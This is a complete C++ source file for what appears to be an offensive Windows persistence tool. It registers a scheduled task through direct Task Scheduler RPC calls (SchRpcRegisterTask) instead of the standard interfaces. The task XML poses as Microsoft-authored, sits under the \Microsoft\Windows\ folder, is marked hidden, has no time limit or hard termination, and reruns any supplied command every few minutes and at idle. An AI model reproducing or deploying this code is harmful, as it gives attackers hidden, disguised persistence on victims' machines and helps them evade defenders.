#pragma warning(disable : 4996)
#pragma warning(disable : 28251)
#pragma comment(lib, "rpcrt4.lib")
#include <Windows.h>
#include <string>
#include <iostream>
#include "SchRpc.h"

constexpr auto TASK_CREATE = 0x2;
constexpr auto TASK_UPDATE = 0x4;

//https://learn.microsoft.com/en-us/windows/win32/rpc/the-midl-user-allocate-function
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { return((void __RPC_FAR*) malloc(cBytes)); }
//https://learn.microsoft.com/en-us/windows/win32/rpc/the-midl-user-free-function
void __RPC_USER midl_user_free(void __RPC_FAR* p) { free(p); }

std::wstring StringToWsring(std::string string) {
    std::wstring wstring(string.size(), *L"");
    std::mbstowcs(wstring.data(), string.c_str(), string.size());
    return wstring;
}

std::wstring XmlGenerator(const wchar_t* path, const wchar_t* time) {
    //https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-schema
    std::string xml1{
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <RegistrationInfo>\n"
        "    <Author>Microsoft</Author>\n"
        "  </RegistrationInfo>\n"
        "  <Triggers>\n"
        "    <RegistrationTrigger>\n"
        "      <Enabled>true</Enabled>\n"
        "    </RegistrationTrigger>\n"
        "    <IdleTrigger>\n"
        "      <Enabled>true</Enabled>\n"
        "    </IdleTrigger>\n"
        "    <TimeTrigger id=\"MicrosoftTrigger\">\n"
        "      <Repetition>\n"
        "        <Interval>P0DT0H"
    };

    std::string xml2{
        "M0S</Interval>\n"
        "        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
        "      </Repetition>\n"
        "      <StartBoundary>2020-01-01T12:00:00</StartBoundary>\n"
        "      <Enabled>true</Enabled>\n"
        "    </TimeTrigger>\n"
        "  </Triggers>\n"
        "  <Settings>\n"
        "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
        "    <AllowHardTerminate>false</AllowHardTerminate>\n"
        "    <StartWhenAvailable>true</StartWhenAvailable>\n"
        "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
        "    <IdleSettings>\n"
        "      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
        "      <RestartOnIdle>false</RestartOnIdle>\n"
        "    </IdleSettings>\n"
        "    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
        "    <Enabled>true</Enabled>\n"
        "    <Hidden>true</Hidden>\n"
        "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
        "    <WakeToRun>false</WakeToRun>\n"
        "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
        "    <Priority>4</Priority>\n"
        "  </Settings>\n"
        "  <Actions>\n"
        "    <Exec>\n"
        "      <Command>"
    };

    std::string xml3{
        "</Command>\n"
        "    </Exec>\n"
        "  </Actions>\n"
        "  <Principals>\n"
        "    <Principal>\n"
        "      <LogonType>InteractiveToken</LogonType>\n"
        "      <RunLevel>LeastPrivilege</RunLevel>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "</Task>\n"
    };

    return StringToWsring(xml1) + time + StringToWsring(xml2) + path + StringToWsring(xml3);
}

bool RpcRegisterTask(std::wstring xml, const wchar_t* name) {
	RPC_STATUS rpc_status;
	RPC_WSTR string_binding;
	RPC_BINDING_HANDLE binding_handle;
	RPC_SECURITY_QOS security_qos{ 0,0,0,0 };
	HRESULT hresult;
	wchar_t* actual_path= nullptr;
	TASK_XML_ERROR_INFO* error= nullptr;

    //https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew
    rpc_status = RpcStringBindingComposeW(
        (RPC_WSTR)L"86D35949-83C9-4044-B424-DB363231FD0C", (RPC_WSTR)L"ncalrpc",
        nullptr, nullptr, nullptr, &string_binding);
	if (rpc_status != RPC_S_OK) {
		return false;
	}

    //https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingfromstringbindingw
    rpc_status = RpcBindingFromStringBindingW(string_binding, &binding_handle);
	if (rpc_status != RPC_S_OK) {
		RpcStringFreeW(&string_binding);
		return false;
	}

	security_qos.Version = 1;
	security_qos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
	security_qos.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
	security_qos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    //https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfoexw
    rpc_status = RpcBindingSetAuthInfoExW(
        binding_handle, nullptr, 
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 
        nullptr, RPC_C_AUTHZ_NONE, &security_qos);
	if (rpc_status != RPC_S_OK) {
		RpcStringFreeW(&string_binding);
		RpcBindingFree(&binding_handle);
		return false;
	}

    //https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/849c131a-64e4-46ef-b015-9d4c599c5167
    hresult = SchRpcRegisterTask(
        binding_handle,
        (std::wstring{ L"\\Microsoft\\Windows\\" } + name).c_str(), xml.c_str(),
        TASK_CREATE | TASK_UPDATE, nullptr, 0, 0, nullptr, &actual_path, &error);
	if (hresult != S_OK) {
        hresult = SchRpcRegisterTask(
            binding_handle, name, xml.c_str(), TASK_CREATE | TASK_UPDATE, 
            nullptr, 0, 0, nullptr, &actual_path, &error);
		if (hresult != S_OK) {
			RpcStringFreeW(&string_binding);
			RpcBindingFree(&binding_handle);
			return false;
		}
	}

	return true;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc == 4) {
        if (RpcRegisterTask(XmlGenerator(argv[1], argv[3]), argv[2])) {
            std::cout << "[+] (^_^)\n";
        }
        else {
            std::cout << "[!] (>_<)\n";
        }
        return EXIT_SUCCESS;
    }
    else {
        std::cout << "[+] usage: sksathcs path name minutes\n";
        return EXIT_FAILURE;
    }
}